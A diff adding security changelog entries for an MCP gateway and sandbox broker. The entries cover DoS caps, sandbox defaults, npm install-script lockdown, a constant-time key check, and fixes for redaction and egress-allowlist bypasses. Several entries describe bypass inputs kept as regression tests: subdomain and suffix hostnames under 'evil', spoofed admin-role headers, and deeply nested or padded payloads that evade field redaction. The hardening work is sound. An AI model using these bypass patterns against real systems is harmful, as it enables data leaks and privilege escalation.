+- **CHG-0139** (2026-07-03) — **LOW test-only regression-lock (NO code change): the MCP audit record never contains the raw PII/secret value (leak-at-rest).** Verified: `McpFinding` carries only type/offset/tag-code (no raw-value field); tags normalized to catalog at control `tasks.py`; metadata is trace-only. Byte-probed a secret/PII battery → raw value ABSENT from the audit-serializable `{findings, compliance_tags, metadata}`; result redacted. **GAP:** no test asserted the AUDIT record (vs egress result) carries no raw value → a future finding.detail/metadata change could leak into the audit DB. **FIX** (test only): `test_mcp_audit_no_raw_leak.py`. **VERIFY:** 6 passed; full gateway 1926 passed. Evidence `mcp-parallel/findings/backstop-p-audit-no-raw-leak-lock/`.
+
+- **CHG-0140** (2026-07-03) — **MEDIUM DoS: internal chat-pipeline MCP routes had no inbound body-size cap.** `internal_tools_call` + `internal_discover_tools` did `body = await request.json()` with NO cap (unbounded buffer), while the org/ext routes all cap via `_mcp_body_too_large` (CHG-0034) + `_mcp_read_body_capped` (CHG-0063) — the docstring even claims "every MCP entry point" uses the streaming cap. The chat user's tool args flow through these routes → gateway OOM. **FIX:** both internal routes now apply the cap (413) after the auth check, before `request.json()`. +4 tests. **VERIFY:** `test_mcp_body_cap.py` 13 passed; full gateway 1930 passed; all 5 MCP routes now cap. Evidence `mcp-parallel/findings/backstop-p-internal-routes-body-cap/`.
+
+- **CHG-0141** (2026-07-03) — **MEDIUM secure-default / tenant-isolation: stdio transport default was fail-OPEN (spawned untrusted npm/uvx IN the gateway host process).** `mcp_stdio_adapter._STDIO_IN_PROCESS_DEFAULT` was `"true"`. `send_jsonrpc()` dispatches on `_stdio_in_process()`: `False` → `_send_jsonrpc_broker` (route the stdio server into the per-org gVisor sandbox via the broker); `True` → `_send_jsonrpc_in_process` (spawn npx/uvx/node IN the gateway process on the host). With the default `"true"`, ANY deploy that didn't explicitly set `MCP_STDIO_IN_PROCESS=false` ran org-registered stdio servers **on the gateway host** — untrusted 3rd-party npm/PyPI code in the shared multi-tenant process, defeating "ALL transports in the sandbox / no unknown npm on the host / NOTHING in the main backend". Fail-OPEN: the *unsafe* mode was the default-by-omission. **FIX:** `_STDIO_IN_PROCESS_DEFAULT = "false"` → unset now routes stdio through the per-org sandbox (parity with remote transports); the in-gateway spawn is **opt-in** via `MCP_STDIO_IN_PROCESS=true` (dev-only/single-tenant, no broker). All 4 pre-existing flag tests set the env explicitly (monkeypatch) → none relied on the old default. +2 tests. **VERIFY:** `test_mcp_stdio_adapter_branch.py` 8 passed (new `test_stdio_default_is_sandbox_secure`: unset → `False` + `DEFAULT=="false"`; `test_stdio_in_process_still_opt_in`: `=true` → `True`); full gateway **1948 passed, 0 failed** (proves the flip is test-safe). Evidence `mcp-parallel/findings/backstop-p-stdio-secure-default/`.
+
+- **CHG-0142** (2026-07-03) — **LOW-MEDIUM supply-chain defense-in-depth (item 8 sub-item 2): sandbox image baked NO npm-level control — install-scripts disabled only by one runtime env path.** Untrusted tenant stdio servers are fetched via `npx`/`npm` in the sandbox; a package's preinstall/install/postinstall is an RCE vector. CHG-0044 force-pins `npm_config_ignore_scripts=true` in `_build_child_env` — authoritative but the ONLY disabling mechanism, covering only the spawn path that calls it (not a manual/debug `npx`, a future spawn path that forgets the env, or a regression that drops the pin). `services/mcp-broker/sandbox-image/Dockerfile` baked no `.npmrc` → outside that path `npx` defaulted `ignore-scripts=false`. **FIX:** bake a GLOBAL npmrc at `/usr/local/etc/npmrc` (= `$PREFIX/etc/npmrc` for the /usr/local prefix, read for ANY user) with `ignore-scripts=true` (+ `audit=false`/`fund=false`/`update-notifier=false` to cut incidental egress from the egress-locked sandbox); root-owned (created pre-`USER sandbox`) so the unprivileged user can't rewrite it. npm precedence (global < env) → the CHG-0044 env still wins and AGREES = belt-and-suspenders, no behavior change; the package bin (the MCP server) still runs, only install hooks suppressed. +1 guard test. **VERIFY:** `test_sandbox_image.py` 5 passed (new `test_dockerfile_bakes_global_npmrc_ignore_scripts`); broker suite `-k "not websocket"` **167 passed, 0 failed**. Real docker-build gate + live malicious-postinstall egress-capture proof host-blocked (no Docker here) → item 8 stays `[ ]`. Evidence `mcp-parallel/findings/backstop-p8-npmrc-global-ignore-scripts/`.
+
+- **CHG-0143** (2026-07-03) — **LOW-MEDIUM observability of a security-critical degraded posture (item 12): sandbox ran under runc (no gVisor) SILENTLY when the runtime was unset/unavailable and not required.** `docker_manager._resolve_runtime` only validates/`raise`s when `MCP_SANDBOX_RUNTIME_REQUIRED=true`; in the default (not-required) path it returned the runtime as-is with NO signal — unset → `None` → Docker default **runc** (shared host kernel, no gVisor); set to `runsc` but not installed → returned `"runsc"` anyway. `docs/mcp/BACKSTOP_FINDINGS.md`: the compose broker sets neither env + prod compose defines no broker → "silently degrading instead of failing closed"; a mis-set env gives no signal. Defaulting `required=true` would break dev/CI + belongs to deployment config. **FIX:** warn ONCE per manager (`self._runtime_degraded_warned`, set in `__init__`) in the not-required branch — unset → warn "WITHOUT a kernel-isolation runtime … set MCP_SANDBOX_RUNTIME=runsc + …_REQUIRED=true"; configured-but-unavailable → warn "NOT available … set …_REQUIRED=true to fail closed"; healthy case quiet. Never raises; returned runtime identical = **zero behavior change**; `required=true` path untouched. +3 tests. **VERIFY:** `test_sandbox_lifecycle.py -k runtime` 7 passed (unset→`None`+warn-once; unavailable→`"runsc"`+warn no-raise; available→`"runsc"`+no-warn); full lifecycle 49 passed; broker `-k "not websocket"` **170 passed, 0 failed**. Real remediation (set envs in both compose files, define broker in prod compose, prove `Runtime=runsc` live) host-blocked → item 12 stays `[ ]`. Evidence `mcp-parallel/findings/backstop-p12-runtime-degraded-warning/`.
+
+- **CHG-0144** (2026-07-03) — **LOW-MEDIUM timing side-channel (item 9 gateway authz): the admin-RBAC server-to-server bypass compared the shared internal key with a non-constant-time `==`.** `main._require_admin_role` bypasses admin-RBAC on `/v1/admin/*` when the caller presents `GATEWAY_INTERNAL_API_KEY` in `X-Gateway-Internal-Key`, but did `header_key == internal_key` — `str.__eq__` short-circuits on the first differing byte → time correlates with the matching-prefix length (secret-comparison timing oracle → byte-by-byte key recovery). Every other gateway secret check uses constant-time compare (`mcp_proxy._valid_internal_key`, `middleware:301`, `metrics_auth`, `policy_signing`); this shim was the lone plain-`==` omission. **FIX:** `hmac.compare_digest(header_key, internal_key)` (+`import hmac`); behaviour identical (correct key bypasses; wrong key → `require_admin` reject). +4 tests. **VERIFY:** `test_admin_internal_key_constant_time.py` 4 passed (correct→`None`; one-byte-off→401/403; missing header→401/403; source guard). NOTE: the full gateway suite has 6–7 PRE-EXISTING failures in an unrelated zero-width-unicode/scan subsystem (another session's) — proven NOT mine by reproducing them on clean-HEAD `main.py`. Evidence `mcp-parallel/findings/backstop-p9-admin-key-constant-time/`.
+
+- **CHG-0145** (2026-07-03) — **LOW test-only regression-lock (NO production code change): backend-bound actor-authz headers are non-spoofable from inbound headers (item 3 per-actor authz).** Verified sound: `_control_request_headers` returns a fresh dict copying NO inbound header; `_backend_proxy_headers` sets `X-Gateway-Roles`/`-User-Id`/`-Key-Prefix`/`-Project-Id` from `_get_auth_context(request)` (`request.state.auth_context`, server-derived from the key's Redis payload; `AuthContext.roles` from `owner.profile.roles`). The gateway never reads `X-Gateway-Roles`/`-User-Id` from an inbound request (grep 0 hits); no live path forwards inbound headers wholesale (only forwarder `_proxy` is dead code). **GAP:** no test asserted non-spoofability → a future change (merging `request.headers`, reviving `_proxy`, a route trusting inbound `X-Gateway-Roles`) would silently open role-escalation with a green suite. **FIX** (test only, `test_mcp_bare_proxy_scan.py`): a request whose INBOUND headers spoof `X-Gateway-Roles: admin,superuser` / `X-Gateway-User-Id: 999999` → asserts the backend headers carry the AUTH-context values (`viewer`/`42`/…) and NONE of the spoofed values appear; empty roles → no `X-Gateway-Roles` header. **VERIFY:** `test_mcp_bare_proxy_scan.py` 60 passed (2 new); full gateway **2002 passed, 0 failed**. Deliberately did NOT add ingress `X-Gateway-*` stripping (no live path forwards/trusts them; risks breaking header propagation not integration-testable here). Evidence `mcp-parallel/findings/backstop-p3-actor-header-nonspoof-lock/`.
+
+- **CHG-0146** (2026-07-03) — **LOW-MEDIUM resource-exhaustion/DoS containment (items 10 & 17): broker agent-RPC timeout had NO upper bound (caller-supplied timeout → unbounded connection hold).** `routes._forward_sandbox_rpc` set the per-RPC agent timeout via `max(_AGENT_TIMEOUT, body.timeouts["init_seconds"], body.timeouts["method_seconds"])` with no ceiling. `body.timeouts` is a caller-supplied dict on `SandboxRpcRequest`. Normally the gateway sends `init=120`/`method≈60` (≈130s), but the broker TRUSTS the caller — a misconfigured gateway (`MCP_STDIO_INIT_TIMEOUT` huge), a buggy caller, or a non-gateway caller could set `init_seconds=99999` → the broker holds the agent httpx connection + serving coroutine open ~28h; a handful exhausts the pool/event-loop → availability DoS for all orgs. The broker must self-defend (parity with the gateway body caps CHG-0034/0063/0140). **FIX:** `_AGENT_TIMEOUT_MAX = max(_AGENT_TIMEOUT, env MCP_BROKER_AGENT_TIMEOUT_MAX default 900s)`; after the fold, clamp `if timeout > _AGENT_TIMEOUT_MAX: log + timeout = _AGENT_TIMEOUT_MAX`. Ceiling ≥ base so an operator's explicit base isn't clipped; 900s generous → no legitimate slow cold-start/tool call affected. +2 tests. **VERIFY:** `test_sandbox_routes.py` 16 passed (`init=method=99999` → effective==`_AGENT_TIMEOUT_MAX`, 99999 never used; `init=120`/`method=60` → effective==base, unclamped); broker `-k "not websocket"` **172 passed, 0 failed**. Evidence `mcp-parallel/findings/backstop-p10-agent-rpc-timeout-clamp/`.
+
+- **CHG-0147** (2026-07-03) — **LOW test-only regression-lock (NO production code change): sandbox egress allowlist is normalized-EXACT-match (no subdomain/suffix bypass) (item 12 egress-lockdown).** `upstream_manager._validate_upstream` (the pre-dial egress chokepoint for all remote transports) matches the URL host against `allowed_hosts` by NORMALIZED (lowercase/trailing-dot-stripped/IDNA) EXACT set membership, fail-closed — verified correct. **GAP:** the only existing test covered a wholly-different host; it did NOT cover the edge cases where allowlist bugs hide — a subdomain of an allowed host (`evil.mcp.example.com`), a string-suffix attack not label-aligned (`notmcp.example.com` — the exact case a naive `endswith` wrongly allows), an allowed host as a left label (`mcp.example.com.evil.com`), and the normalization cases that must still ALLOW (case/trailing-dot). A future "support subdomains" refactor to `endswith`/`in` would silently open an egress-exfil bypass. **FIX** (test only, `test_ssrf_ip_classifier.py`): +13 parametrized — deny non-exact (subdomain/suffix/left-label/different/IP-not-in-list → `egress denied` -32002); allow normalized-exact (exact/case both sides/trailing-dot both sides/IP-exact/second-of-multiple → returns None); empty `allowed_hosts` → fail closed. **VERIFY:** `test_ssrf_ip_classifier.py` 36 passed (13 new); `suffix_string_attack` (`notmcp.example.com` DENIED) proves exact set membership, not `endswith`. `_validate_upstream` is pure (no dial/network) → version-agnostic (runs on 3.14 venv though image is 3.12). RESIDUALS (documented, not shipped): (1) broker `_forward_sandbox_rpc` reads the agent response `.json()`/`.text` with no size cap — real fix needs `client.post`→capped `client.stream` (breaks all post-mocks; LOW/gVisor-contained) deferred; (2) `_log_stderr` stderr-flood (py3.12-vs-3.14 asyncio-dependent, unverifiable vs prod). Evidence `mcp-parallel/findings/backstop-p12-egress-allowlist-exact-match-lock/`.
+
+- **CHG-0148** (2026-07-03) — **MEDIUM 1.4 leak: name-based field redaction bypassable by DEEP NESTING (field below max_depth=10 egressed RAW).** Both `apply_field_redaction` impls (`gateway/ai_mesh_gateway/policy_engine.py` + `control/ai_mesh_control/policy/redaction.py`) walked the tool result with `max_depth=10` and returned the PARTIALLY-redacted result on overflow (fail-OPEN). But the gateway only rejects results deeper than `_MCP_MAX_RESULT_DEPTH` (**500**) BEFORE redaction → a policy's `redaction_fields` target nested at depth 11..500 was never visited and egressed RAW (empirically confirmed via pure import: `ssn` wrapped 40 deep survived). Opaque name-redacted fields (`session_token`) are NOT caught by the content/pattern scan → field redaction is their only protection. **FIX:** `max_depth` 10→500 (covers the depth guard) + recursive `_walk` → ITERATIVE explicit-stack walk (a 500-deep recursion would blow the recursion limit → raise → caller fail-open, re-introducing the leak; iterative has no recursion exposure, identical masking semantics, `masked`/identity-on-noop preserved, work still bounded by `max_nodes`). Applied to BOTH impls. +1 test. **VERIFY:** `test_mcp_scan_orchestrator.py -k field_redaction` 8 passed (new deep-nesting lock; homoglyph/non-mutating/identity still pass); full gateway **2010 passed, 0 failed**; control variant verified via standalone pure-import repro. RESIDUALS (documented): (1) node-count overflow (`max_nodes=100k`) still fail-open on a huge-but-shallow result → needs fail-closed block; (2) stdlib `copy.deepcopy` RecursionErrors ~250 depth → caller fail-open in the ~250..500 window (pre-existing; recommend lowering `_MCP_MAX_RESULT_DEPTH` below the deepcopy limit or failing closed). Evidence `mcp-parallel/findings/backstop-p2-field-redaction-deep-nesting-bypass/`.
+
+- **CHG-0149** (2026-07-03) — **LOW-MEDIUM robustness (closes CHG-0148 residual #2): MCP result/arg depth guard was mis-calibrated ABOVE the recursion-crash threshold it pre-empts.** `mcp_proxy._MCP_MAX_RESULT_DEPTH` (CHG-0115 proactive guard, meant to fire BEFORE the recursive scan hits the recursion limit and emit a clean `RESOURCE_LIMIT`) was set at **500**, but `copy.deepcopy` (first recursive op in `apply_field_redaction`) empirically RecursionErrors at ~498 (shallow; LOWER under a real ambient stack) and the recursive scan crashes earlier — so a depth-498..500 result passed the guard, crashed deepcopy → caught only as generic `SCAN_ERROR`, and left the control-plane redactor exposed to results the gateway forwarded. NOTE: corrects CHG-0148 residual #2 — NOT a fail-open leak on the gateway floor (its `except Exception` fail-closes it), but a guard-calibration + control-path-robustness gap. **FIX:** `_MCP_MAX_RESULT_DEPTH` 500→**200** (env-tunable; also defaults `_MCP_MAX_ARG_DEPTH`); 200 is ~10× any realistic legit result but below the crash threshold, so the iterative guard reliably fires first (clean `RESOURCE_LIMIT` before any recursive copy/scan). Depth-201..~498 now blocks (fail-closed) vs redact-and-forward; depth >200 is pathological. +1 test. **VERIFY:** `test_mcp_result_block_count_cap.py` 15 passed (new `test_depth_cap_fires_below_deepcopy_recursion_limit`: depth-300 → `result_too_deeply_nested` + `RESOURCE_LIMIT`, no `result_scan_error`); full gateway **2034 passed, 0 failed**. RESIDUAL: CHG-0148 #1 (node-count overflow) unchanged (clean fix over-blocks benign large results — documented tradeoff). Evidence `mcp-parallel/findings/backstop-p2-depth-guard-recalibrate/`.
+
+- **CHG-0150** (2026-07-03) — **MEDIUM 1.4 leak + resource-bomb containment (CLOSES CHG-0148 residual #1): result node-count guard.** `apply_field_redaction` bounds its walk with `max_nodes=100k` and returned the PARTIALLY-masked result on overflow (fail-open). The depth guard bounds NESTING but not WIDTH — a wide-but-shallow result (10 MB list of small objects, millions of nodes) passed all caps, and a `redaction_fields` target beyond the 100k-th node egressed RAW (pure-import repro: `ssn` behind 150k padding nodes leaked). Opaque named fields aren't caught by the content scan. Separately, such a wide result forces a ~2.1s `copy.deepcopy` (measured; on the FULL structure regardless of `max_nodes`) + recursive scan = resource bomb. **FIX:** (1) `mcp_proxy._exceeds_node_count` (iterative, short-circuits O(limit)) + `_MCP_MAX_RESULT_NODES` (default 1M) wired into `_scan_tool_result_floor` after the depth guard — a result wider than the cap BLOCKS cleanly (`RESOURCE_LIMIT`/`result_too_many_nodes`) BEFORE the deepcopy/scan/redact, fail-closed (monitor forwards unscanned). (2) redaction `max_nodes` 100k→2M in BOTH impls (`policy_engine.py` + `control/policy/redaction.py`) — above the 1M guard so anything passing is FULLY walked. Behavior: results wider than 1M nodes (~10× any realistic result) block under a real action (trims resource bombs). +4 tests (light). **VERIFY:** `test_mcp_result_block_count_cap.py` + `test_mcp_scan_orchestrator.py` pass; full gateway **2053 passed, 0 failed**; control verified via standalone pure-import repro. (A mid-work `test_output_guard_redos` flake was from initial million-node test payloads — passes in isolation, references none of this code — fixed by lightening the tests.) Evidence `mcp-parallel/findings/backstop-p2-node-count-guard/`.
+
+- **CHG-0151** (2026-07-03) — **MEDIUM cross-tenant availability / resource-bomb containment (closes a residual deferred across CHG-0146/0147): broker buffered the sandbox agent's RPC response UNBOUNDED.** `routes._post_agent_rpc` forwarded each RPC via `await client.post(...)` and `_forward_sandbox_rpc` read the reply with `response.json()`/`.text` — `httpx.post()` buffers the ENTIRE body unbounded. The sandbox agent runs untrusted tenant MCP servers (gVisor + `X-Sandbox-Agent-Key` are the isolation), but the broker TRUSTED the agent's reply size — and the broker is ONE shared process routing every org's sandbox, so a buggy/compromised agent returning a huge body OOMs it = cross-tenant availability breach. **FIX:** `_AGENT_MAX_RESPONSE_BYTES` (16 MiB = 2× the agent's 8 MiB self-cap; env `MCP_BROKER_AGENT_MAX_RESPONSE_BYTES`) + `_read_agent_response_capped` (`client.stream` + `aiter_bytes`, raises HTTP 502 the instant the running total crosses the ceiling; rebuilds a fully-read `httpx.Response` used `.json()`/`.text` unchanged); `_post_agent_rpc` calls it instead of `.post()`. Cold-start transport error still raises `httpx.HTTPError` (retry loop unchanged); too-large reply raises `HTTPException(502)` → fails fast, no retry. Required migrating 2 broker test files' agent-RPC mocks `post`→`stream` (shared `_agent_stream_mock`) — the reason it was deferred; migration mechanical, all 25 affected tests pass. +2 cap tests. **VERIFY:** `test_sandbox_routes.py` + `test_agent_ready_retry.py` 25 passed (over-cap 2 KiB/1 KiB → 502; under-cap ok); broker `-k "not websocket"` **174 passed, 0 failed**. Parity with the gateway upstream cap CHG-0064 / agent upstream cap CHG-0066. Evidence `mcp-parallel/findings/backstop-p10-broker-agent-response-cap/`.
+
+- **CHG-0152** (2026-07-03) — **LOW-MEDIUM availability/resource-bomb containment (item 17; closes the last deferred code residual, flagged since CHG-0144): sandbox agent `_log_stderr` self-hung on an oversized stderr line.** `stdio_manager._log_stderr` drains a spawned stdio server's stderr via `readline()` inside a `while True` wrapped by a catch-all `except Exception: pass` OUTSIDE the loop. The StreamReader has `limit=_MAX_LINE_BYTES` (8 MiB); an untrusted server flooding stderr with a huge UNTERMINATED line makes `readline()` raise once past the limit → the raise hit the outer `except` → the loop EXITED → stderr never drained again → OS pipe filled → child BLOCKED on `write(2)` = self-hang of that org's server. DEFERRED since CHG-0144 because the raise type + buffer disposition are Python-version-sensitive (sandbox=3.12, test venv=3.14) — now verified on BOTH via docker `python:3.12-slim`: `readline()` over-limit CONSUMES the buffer on both (3.14→`LimitOverrunError`, 3.12→`ValueError`; the earlier "3.12 leaves data" note was WRONG). **FIX:** catch INSIDE the loop and `continue` (NO blocking read — the CHG-0144 `read()` drain was the dead-end): `except (asyncio.LimitOverrunError, ValueError): LOG.warning(...); continue`. A huge line drains in limit-sized chunks across successive raises; a normal line after the flood reads cleanly; the reader survives. stdout reader unchanged (fail-closes an oversized stdout line). +2 tests. **VERIFY:** `test_stdio_exit_reason.py` 11 passed (flood-survival + normal-path); fast agent sweep 88 passed; CROSS-VERSION: REAL `_log_stderr` run on `python:3.12-slim` via docker → survived flood, next line captured=True. Evidence `mcp-parallel/findings/backstop-p17-stderr-flood-self-hang/`.
+
+- **CHG-0153** (2026-07-03) — **LOW defense-in-depth (item 8): sandbox image put CWD on the agent's Python import path (PYTHONPATH trailing colon).** `Dockerfile` had `ENV PYTHONPATH="/opt/shared:${PYTHONPATH}"`; `${PYTHONPATH}` is UNDEFINED at build → resolved to literal `"/opt/shared:"` — trailing colon = an EMPTY `sys.path` entry = the process CWD (verified in the built image: `PYTHONPATH=[/opt/shared:]`, `"" in sys.path == True`). A sandbox agent spawning untrusted MCP servers must not carry CWD on its import path (import-hijack footgun); also the source of the docker build `UndefinedVar(line 45)` warning. **FIX:** `ENV PYTHONPATH="/opt/shared"` (plain; `docker run -e` overrides anyway). **VERIFY:** rebuilt via docker (no `UndefinedVar` warning); ran the REAL agent CMD `uvicorn agent.main:app` → `/health` `{"status":"ok"}` + "Application startup complete" (empty entry NOT load-bearing — uvicorn imports the `agent` pkg itself; `ai_mesh_shared` via `/opt/shared`); runtime `PYTHONPATH=[/opt/shared]`. BONUS (docker IS available here): verified CHG-0142 END-TO-END in a rebuild — `/usr/local/etc/npmrc`=`ignore-scripts=true`(+audit/fund/update-notifier off), `npm config get ignore-scripts`→true as the sandbox user, `globalconfig`=`/usr/local/etc/npmrc`, root-owned. OPERATIONAL FINDING for the deploy owner: the deployed `ai-mesh/mcp-sandbox:latest` PREDATES CHG-0142 (`ignore-scripts`→false there) — the image must be REBUILT + redeployed for the baked-npmrc + PYTHONPATH controls to take effect (CHG-0044 per-spawn env pin still enforces ignore-scripts at runtime today). gVisor/runsc NOT installed (`docker info` Runtimes: runc) → item 12 still blocked. Evidence `mcp-parallel/findings/backstop-p8-sandbox-pythonpath-cwd/`.
+
+- **CHG-0154** (2026-07-06) — **MEDIUM: MCP_HOST_TOOLS end-to-end wiring (on-demand sandbox CLI binaries).** Shared `mcp_host_tools.py` contract; presets `host_tools` → `env_vars.MCP_HOST_TOOLS`; control serializer validation + optional allowlist; `MCP_HOST_TOOL_FAILED` classifier; frontend Host CLI tools UI; agent `stdio_manager` uses shared install path. **VERIFY:** 22 host-tool unit tests + gateway 2091 + broker 196. Evidence `mcp-parallel/findings/backstop-p-host-tools-wiring/`.
+
+- **CHG-0155** (2026-07-07) — **MEDIUM: Sandbox writable HOME + npx isEntrypoint spawn fix (MCP_HOST_TOOLS live).** `HOME=/var/cache/home` (semgrep `~/.semgrep` on RO rootfs); `_resolve_npx_spawn` rewrites bare `npx -y <pkg>` → `node <main.js>` (`mcp-server-semgrep` isEntrypoint gate). **VERIFY:** live `mcp_page_host_tools_quick.py` → `hostToolsQuickPass:true`, semgrep connected `tools_count=7`, bogus `MCP_HOST_TOOL_FAILED`. Evidence `mcp-parallel/findings/backstop-p-host-tools-writable-home/live_quick.json`.
